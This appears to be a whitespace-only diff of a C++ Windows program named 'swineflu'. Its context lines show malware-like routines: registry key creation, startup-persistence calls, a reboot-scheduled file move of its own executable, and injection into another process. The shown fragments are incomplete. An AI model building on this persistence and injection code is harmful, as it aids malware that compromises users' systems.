@@ -66,7 +66,7 @@ void firstTimeRunCheck()
 	str.append("\\swineflu.exe");
 
 	string swine_name = "swinef2";
-
+	
 	HKEY hKey = NULL;
 	DWORD rtime;
 
@@ -80,7 +80,7 @@ void firstTimeRunCheck()
 
 		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef3", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
 
-
+		
 
 		if (ERROR_SUCCESS != j)
 			cout << "Error: Could not create registry key " << "swinef2" << endl << "\tERROR: " << j << endl;
@@ -94,13 +94,13 @@ void firstTimeRunCheck()
 		adminstartup();
 
 		addStartUpEntry();
-
+		
 		MoveFileEx(str.c_str(), // Source File.
 			0, // Destination as null.
 			MOVEFILE_DELAY_UNTIL_REBOOT);
 
 
-	}
+		}
 	else
 	{
 		printf("reg exists");
@@ -114,6 +114,7 @@ void injectMethod()
 	MyInjecteeFuncs::inject(process_id);
 	printf("\n %d", process_id);
 }
+
 
 
 int _tmain(int argc, _TCHAR* argv[])
@@ -130,5 +131,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	getchar();
 	return 0;
 }
+
+
 
 
